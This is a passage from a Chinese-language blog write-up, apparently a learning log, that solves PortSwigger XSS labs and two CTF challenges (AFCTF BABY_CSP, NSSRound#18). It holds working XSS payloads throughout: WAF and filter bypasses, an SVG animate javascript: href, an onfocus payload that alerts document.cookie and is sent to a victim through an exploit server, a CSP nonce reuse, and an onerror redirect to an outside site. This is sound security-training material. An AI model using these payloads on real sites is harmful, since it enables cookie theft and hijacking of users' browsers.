class="params">comments</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> userComments = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;user-comments&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; comments.<span class="property">length</span>; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            comment = comments[i];</span><br><span class="line">            <span class="keyword">let</span> commentSection = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;section&quot;</span>);</span><br><span class="line">            commentSection.<span class="title function_">setAttribute</span>(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;comment&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> firstPElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> avatarImgElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">            avatarImgElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;avatar&quot;</span>);</span><br><span class="line">            avatarImgElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, comment.<span class="property">avatar</span> ? <span class="title function_">escapeHTML</span>(comment.<span class="property">avatar</span>) : <span class="string">&quot;/resources/images/avatarDefault.svg&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (comment.<span class="property">author</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (comment.<span class="property">website</span>) &#123;</span><br><span class="line">                    <span class="keyword">let</span> websiteElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">                    websiteElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;author&quot;</span>);</span><br><span class="line">                    websiteElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;href&quot;</span>, comment.<span class="property">website</span>); <span class="comment">// 当时我看到这里没有做任何处理，我以为漏洞在这里。</span></span><br><span class="line">                    firstPElement.<span class="title function_">appendChild</span>(websiteElement)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">let</span> newInnerHtml = firstPElement.<span class="property">innerHTML</span> + <span class="title function_">escapeHTML</span>(comment.<span class="property">author</span>)</span><br><span class="line">                firstPElement.<span class="property">innerHTML</span> = newInnerHtml  <span class="comment">// 这里将a标签放进p标签里。</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">// ......</span></span><br></pre></td></tr></table></figure>

<p>a 标签的href属性可以利用  javascript 伪协议 来执行代码。正则在前端，我将<code>pattern=&quot;(http:|https:).+&quot;</code>，修改为<code>pattern=&quot;(http:|https:|javascript:).+&quot;</code>，接着输入内容：</p>
<img src="/XSS/XSS/image-20250729141738758.png" class="" title="image-20250729141738758">

<img src="/XSS/XSS/image-20250729141829147.png" class="" title="image-20250729141829147">

<p>它后端还会识别网站，我输入<code>http://example.com</code>可以，说明必须以<code>http:</code>或<code>https:</code>开头。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">websiteElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;href&quot;</span>, comment.<span class="property">website</span>);</span><br></pre></td></tr></table></figure>

<p>我试过恶意闭合双引号等办法，都已失败告终。</p>
<p>现在看看正确的解题方法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html.<span class="title function_">replace</span>(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>); <span class="comment">// 如果html是字符串时，replace只会替换一次。</span></span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250729143741564.png" class="" title="image-20250729143741564">

<img src="/XSS/XSS/image-20250729143716823.png" class="" title="image-20250729143716823">

<p><code>&lt;/h2&gt;</code>被解析了，所以我们看不到，当我们输入: <code>&lt;h2&gt;&lt;h2&gt;hello&lt;/h2&gt;</code>:</p>
<img src="/XSS/XSS/image-20250729143915705.png" class="" title="image-20250729143915705">

<p>第一个&lt;&gt;被替换，导致我们后面的可以被解析成功，我们可以看到。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;&lt;img src=1 onerror=alert(1) /&gt;</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250729144419379.png" class="" title="image-20250729144419379">

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (comment.<span class="property">body</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> commentBodyPElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line">    commentBodyPElement.<span class="property">innerHTML</span> = <span class="title function_">escapeHTML</span>(comment.<span class="property">body</span>);  <span class="comment">// 我们从这里写入恶意代码。</span></span><br><span class="line"></span><br><span class="line">    commentSection.<span class="title function_">appendChild</span>(commentBodyPElement);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>做到这里，感觉有一些虚浮了，后面学习的时候要总结总结了。总结这些漏洞到底是由啥引起的，做到这里，我都忘记了有些漏洞到底是有啥引起的。</p>
</blockquote>
<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="大多数标签和属性被禁止的反射型XSS攻击"><a href="#大多数标签和属性被禁止的反射型XSS攻击" class="headerlink" title="大多数标签和属性被禁止的反射型XSS攻击"></a>大多数标签和属性被禁止的反射型XSS攻击</h3><h4 id="实验要求-1"><a href="#实验要求-1" class="headerlink" title="实验要求"></a>实验要求</h4><p>该实验在搜索功能中存在一个反射型XSS（跨站脚本）漏洞，但使用了Web应用防火墙(WAF)来防御常见的XSS攻击向量。</p>
<p>实验目标是：构造一个能够绕过WAF防护并成功调用print()函数的跨站脚本攻击。</p>
<p>重要说明：<br>您的解决方案必须无需任何用户交互。在您自己的浏览器中手动调用print()函数将无法完成实验。</p>
<h4 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h4><p>实验告诉我们搜索功能这里存在反射型XSS漏洞。</p>
<p>我在这里测试了好几个标签，如：<code>a、input、button、img、script</code>，这些都被过滤了。</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS payload 备忘录</a></p>
<p>打开代理，打开yakit，启用交互式劫持，输入<code>&lt;&gt;</code>。</p>
<p>进入Web Fuzzer。</p>
<img src="/XSS/XSS/image-20250730100152059.png" class="" title="image-20250730100152059">

<p>复制tags标签。</p>
<img src="/XSS/XSS/image-20250730095938675.png" class="" title="image-20250730095938675">

<p>插入到临时字典。</p>
<img src="/XSS/XSS/image-20250730100257643.png" class="" title="image-20250730100257643">

<p>发送请求。</p>
<img src="/XSS/XSS/image-20250730100526491.png" class="" title="image-20250730100526491">

<p>body标签可用，输入<code>&lt;body onload=alert()&gt;</code></p>
<img src="/XSS/XSS/image-20250730100628951.png" class="" title="image-20250730100628951">

<p>onload属性也被禁止了，复制events事件，插入到临时字典，发起请求。</p>
<img src="/XSS/XSS/image-20250730100912245.png" class="" title="image-20250730100912245">

<p>里面有一个onresize事件，属性没有禁止，如何触发onresize事件，当修改窗口大小时，会触发。</p>
<img src="/XSS/XSS/image-20250730101221902.png" class="" title="image-20250730101221902">

<p>题目要求:您的解决方案必须无需任何用户交互。在您自己的浏览器中手动调用print()函数将无法完成实验。</p>
<p>进入服务器，在body输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&#x27;https://0a0900ba03d4a87980091c2a00890047.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29+%3E&#x27;</span> <span class="attr">onload</span>=<span class="string">&#x27;this.style.height=300&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>储存后，将其发给受害者，在加载完成后，触发onload事件，修改了高度，触发onresize事件，执行print()函数。</p>
<blockquote>
<p>此题是后端的waf。</p>
</blockquote>
<h3 id="禁止了所有除自制标签以外的所有标签的XSS攻击"><a href="#禁止了所有除自制标签以外的所有标签的XSS攻击" class="headerlink" title="禁止了所有除自制标签以外的所有标签的XSS攻击"></a>禁止了所有除自制标签以外的所有标签的XSS攻击</h3><h4 id="实验要求-2"><a href="#实验要求-2" class="headerlink" title="实验要求"></a>实验要求</h4><p>这个实验会屏蔽所有 HTML 标签，只允许自定义标签。</p>
<p>要解决这个实验，需要实施一次跨站脚本攻击，注入一个自定义标签，并自动弹出<code>document.cookie</code>（文档的 Cookie 信息）。</p>
<h4 id="实验过程-2"><a href="#实验过程-2" class="headerlink" title="实验过程"></a>实验过程</h4><p>搜索界面存在XSS漏洞，实验告诉我们屏蔽了所有HTML标签，只允许自制标签。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&lt;xss id=&#x27;xss&#x27; onfocus=alert(1) tabindex=1 &gt;#xss</span><br></pre></td></tr></table></figure>

<p>tabindex属性赋予xss标签能够被聚焦的能力，1表示第一个被触发。</p>
<p>onfocus事件：当元素获得聚焦时触发。</p>
<p>id&#x3D;’xxx’ 给xss标签赋予id。</p>
<p>#xss  让页面滚动到id&#x3D;’xss’的元素，间接触发元素的聚焦行为。</p>
<p>这个过程还需要手动去触发。</p>
<img src="/XSS/XSS/image-20250730115204233.png" class="" title="image-20250730115204233">

<p>但是当我们将其保存到服务器，将1换为document.cookie：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.location=&#x27;https://0ab200d303fc4ab380cd9e1200f500a0.web-security-academy.net/?search=%3Cxss%20id=%27xss%27%20onfocus=alert(document.cookie)%20tabindex=1%20%3E#xss&#x27;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>我们将其保存在<a target="_blank" rel="noopener" href="https://exploit-0a8d009203e74a8080659d5b01dd0002.exploit-server.net/exploit%E9%A1%B5%E9%9D%A2%E3%80%82">https://exploit-0a8d009203e74a8080659d5b01dd0002.exploit-server.net/exploit页面。</a></p>
<p>将这个网址发送给受害者就会触发xss漏洞。</p>
<p>我们要完成此实验：</p>
<img src="/XSS/XSS/image-20250730115837685.png" class="" title="image-20250730115837685">

<p>要点击Deliver exploit to victim。</p>
<h3 id="所有事件和-href-属性均被阻止的反射型-XSS"><a href="#所有事件和-href-属性均被阻止的反射型-XSS" class="headerlink" title="所有事件和 href 属性均被阻止的反射型 XSS"></a>所有事件和 href 属性均被阻止的反射型 XSS</h3><h4 id="实验要求-3"><a href="#实验要求-3" class="headerlink" title="实验要求"></a>实验要求</h4><p>这个实验包含一个反射型 XSS 漏洞，同时存在一些白名单标签，但所有事件和锚点的 href 属性都被屏蔽了。</p>
<p>要解决这个实验，需要执行一次跨站脚本攻击，注入一个向量，当该向量被点击时，会调用 alert 函数。</p>
<p>请注意，你需要在向量中包含 “Click” 这个词，以促使实验中的模拟用户点击你的向量。例如：</p>
<p><code>&lt;a href=&quot;&quot;&gt;Click me&lt;/a&gt;</code></p>
<h4 id="实验过程-3"><a href="#实验过程-3" class="headerlink" title="实验过程"></a>实验过程</h4><p>实验告诉我们存在白名单标签，我们通过<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS payload 备忘录</a>的标签字典测试一下。</p>
<img src="/XSS/XSS/image-20250731090453332.png" class="" title="image-20250731090453332">

<p>animate a svg title image 这些标签没有被禁止。</p>
<p>实验要求还告诉我们，所有事件和描点的href属性被屏蔽。</p>
<p>svg标签：向html页面嵌入一个独立的窗口和坐标体系。</p>
<p>animate标签：用于动态设置SVG元素的属性值。</p>
<p>a标签：svg的描元素，用于定义超链接。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">attributeName</span>=<span class="string">href</span> <span class="attr">values</span>=<span class="string">javascript:alert(1)</span> &gt;</span><span class="tag">&lt;/<span class="name">animate</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">10</span> <span class="attr">y</span>=<span class="string">20</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>attributeName：要更改的属性名称，values：要更改的值的内容。</p>
<p>text标签：svg的矢量文本元素，用于绘制文本。</p>
<p>此payload动态调整a标签的href属性，让其为javascript:伪协议，当我们点击文本后，就会执行javascript代码。</p>
<img src="/XSS/XSS/image-20250731092804292.png" class="" title="image-20250731092804292">

<p>点击Click me 即可完成实验（不点击，好像也可以完成实验）。</p>
<h3 id="允许部分SVG标记的反射型XSS"><a href="#允许部分SVG标记的反射型XSS" class="headerlink" title="允许部分SVG标记的反射型XSS"></a>允许部分SVG标记的反射型XSS</h3><h4 id="实验要求-4"><a href="#实验要求-4" class="headerlink" title="实验要求"></a>实验要求</h4><p>这个安全实验室存在一个简单的反射型XSS漏洞。网站虽然屏蔽了常见HTML标签，但遗漏了某些SVG标签和事件。</p>
<p>要完成实验，请构造一个跨站脚本攻击，成功调用alert()函数。</p>
<h4 id="实验过程-4"><a href="#实验过程-4" class="headerlink" title="实验过程"></a>实验过程</h4><p>网站屏蔽了常见的HTML标签，我们通过<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS payload 备忘录</a>的tag进行爆破，发现：</p>
<img src="/XSS/XSS/image-20250731102123243.png" class="" title="image-20250731102123243">

<p>只有这些标签可以用。</p>
<p>爆破事件属性：</p>
<img src="/XSS/XSS/image-20250731103646914.png" class="" title="image-20250731103646914">

<p>onbegin事件属性可以利用，其仅限于SVG动画元素。</p>
<p>onbegin事件在动画开始播放时执行脚本。通常用于以下SVG动画元素：<code>animate animateTransform animateMotion set</code> ，</p>
<p>payload:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animateTransform</span> <span class="attr">onbegin</span>=<span class="string">alert(1)</span> &gt;</span><span class="tag">&lt;/<span class="name">animateTransform</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250731104732602.png" class="" title="image-20250731104732602">

<p>animateTransform 是SVG中专门用于对元素进行变形动画的元素，它可以实现平移、旋转、缩放、斜切等变换效果。</p>
<h2 id="AFCTF-2021-BABY-CSP"><a href="#AFCTF-2021-BABY-CSP" class="headerlink" title="[AFCTF 2021]BABY_CSP"></a>[AFCTF 2021]BABY_CSP</h2><img src="/XSS/XSS/image-20250724073356812.png" class="" title="image-20250724073356812">

<p>源码里面本来没有任何内容，当我们点击标签时，页面源码会添加一些内容：</p>
<img src="/XSS/XSS/image-20250724073528487.png" class="" title="image-20250724073528487">

<p>感觉可以写入恶意代码。		</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?school=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>报错了：</p>
<img src="/XSS/XSS/image-20250724073818519.png" class="" title="image-20250724073818519">

<p>拒绝执行我们插入的XSS代码，缺少nonce属性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?school=&lt;script nonce=&quot;29de6fde0db5686d&quot;&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>就可以执行了。</p>
<p>我有点懵逼的是，将alert(1)替换为alert(flag)，就可以得到flag。</p>
<blockquote>
<p>考察的知识点：CSP内容安全策略</p>
</blockquote>
<h2 id="NSSRound-18-Basic-门酱想玩什么呢？"><a href="#NSSRound-18-Basic-门酱想玩什么呢？" class="headerlink" title="[NSSRound#18 Basic]门酱想玩什么呢？"></a>[NSSRound#18 Basic]门酱想玩什么呢？</h2><p>启动页面有隐藏的提示：</p>
<img src="/XSS/XSS/image-20250724085458920.png" class="" title="image-20250724085458920">

<p>有一个PHP文件：nssctfroundSpring.php</p>
<p>访问后有一部分源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//部分关键代码</span></span><br><span class="line"><span class="variable">$contentLines</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$comment</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/\S+$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>], <span class="variable">$matches</span>) &amp;&amp; <span class="title function_ invoke__">end</span>(<span class="variable">$contentLines</span>) === <span class="string">&#x27;/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$urlParts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$urlParts</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27;</span> . <span class="variable">$matches</span>[<span class="number">0</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//.......</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>挑一些不易懂的说说：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;/^https?:\/\/\S+$/&#x27;</span>; <span class="comment">// ^https? 开头https匹配0次或1次，://匹配，\S+匹配任意非空白字符</span></span><br><span class="line"><span class="string">&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;</span>; <span class="comment">// [^\/] 匹配除/以外的任意字符，必须以.png后缀结尾。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://&quot;onerror=&quot;alert(1)&quot;/1.png /png</span><br></pre></td></tr></table></figure>

<p>可以绕过。</p>
<p>进入评论区，内容输入payload，标题为123，弹窗，说明可以进行XSS攻击。</p>
<img src="/XSS/XSS/image-20250724111520821.png" class="" title="image-20250724111520821">

<p>门酱说它想玩元梦之星。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://&quot;onerror=&quot;document.location=&#x27;https://ymzx.qq.com/&#x27;&quot;/1.png /png</span><br></pre></td></tr></table></figure>

<p>内容输入上面内容，发现可以跳转。<br>我们将<br><code>http://node4.anna.nssctf.cn:28698/words/?title=MTIz&amp;content=aHR0cHMlM0ElMkYlMkYlMjJvbmVycm9yJTNEJTIyZG9jdW1lbnQubG9jYXRpb24lM0QnaHR0cHMlM0ElMkYlMkZ5bXp4LnFxLmNvbSUyRiclMjIlMkYxLnBuZyUyMCUyRnBuZw%3D%3D</code>链接放入：</p>
<img src="/XSS/XSS/image-20250724112537643.png" class="" title="image-20250724112537643">

<p>点击给门酱看就可以出现flag。</p>
<blockquote>
<p>我是真吐了，一到元梦之星页面就蓝屏。这道题也有问题了，环境没有配置好。</p>
</blockquote>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/categories/">categories</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.</span> <span class="toc-text">反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">2.</span> <span class="toc-text">存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-1"><span class="toc-number">2.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-1"><span class="toc-number">2.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM-XSS"><span class="toc-number">3.</span> <span class="toc-text">DOM XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Edocument-write%E6%8E%A5%E6%94%B6%E5%99%A8%E7%9A%84DOM-XSS%E6%94%BB%E5%87%BB%EF%BC%8C%E4%BD%BF%E7%94%A8location-search%E4%BD%9C%E4%B8%BA%E6%94%BB%E5%87%BB%E6%BA%90"><span class="toc-number">3.1.</span> <span class="toc-text">基于document.write接收器的DOM XSS攻击，使用location.search作为攻击源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-2"><span class="toc-number">3.1.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-2"><span class="toc-number">3.1.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Edocument-write%E6%8E%A5%E6%94%B6%E5%99%A8%E7%9A%84DOM-XSS-%E6%94%BB%E5%87%BB%EF%BC%8C%E5%9C%A8select%E5%85%83%E7%B4%A0%E5%86%85%E5%88%A9%E7%94%A8location-search%E4%BD%9C%E4%B8%BA%E6%94%BB%E5%87%BB%E6%BA%90"><span class="toc-number">3.2.</span> <span class="toc-text">基于document.write接收器的DOM XSS 攻击，在select元素内利用location.search作为攻击源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-3"><span class="toc-number">3.2.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-3"><span class="toc-number">3.2.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Elocation-search%E6%BA%90%E9%80%9A%E8%BF%87innerHTML%E6%8E%A5%E6%94%B6%E5%99%A8%E8%A7%A6%E5%8F%91%E7%9A%84DOM%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">基于location.search源通过innerHTML接收器触发的DOM型XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82"><span class="toc-number">3.3.1.</span> <span class="toc-text">实验要求:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-4"><span class="toc-number">3.3.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8location-search%E6%94%BB%E5%87%BBjQuery%E7%9A%84a%E6%A0%87%E7%AD%BEhref%E5%B1%9E%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84DOM%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.4.</span> <span class="toc-text">利用location.search攻击jQuery的a标签href属性导致的DOM型XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-4"><span class="toc-number">3.4.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-5"><span class="toc-number">3.4.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-hashchange-%E4%BA%8B%E4%BB%B6%E5%9C%A8-jQuery-%E9%80%89%E6%8B%A9%E5%99%A8%E6%8E%A5%E6%94%B6%E5%99%A8%E4%B8%AD%E8%A7%A6%E5%8F%91%E7%9A%84-DOM-XSS-%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.5.</span> <span class="toc-text">利用 hashchange 事件在 jQuery 选择器接收器中触发的 DOM XSS 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-5"><span class="toc-number">3.5.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-6"><span class="toc-number">3.5.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AngularJS%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%AD%E5%AD%98%E5%9C%A8DOM%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%88XSS%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%B8%94%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%A2%ABHTML%E7%BC%96%E7%A0%81"><span class="toc-number">3.6.</span> <span class="toc-text">AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-6"><span class="toc-number">3.6.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="toc-number">3.6.2.</span> <span class="toc-text">实验过程:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-DOM-XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.7.</span> <span class="toc-text">反射型 DOM XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 